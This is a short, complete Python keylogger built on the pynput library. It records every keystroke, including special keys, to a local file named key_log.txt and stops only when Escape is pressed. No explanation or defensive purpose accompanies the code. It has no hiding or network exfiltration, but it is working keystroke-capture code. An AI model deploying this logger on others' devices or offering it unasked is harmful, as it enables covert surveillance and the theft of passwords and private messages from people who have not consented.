import pynput
from pynput.keyboard import Key, Listener

# Log file path
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop listener if escape key is pressed
    if key == Key.esc:
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
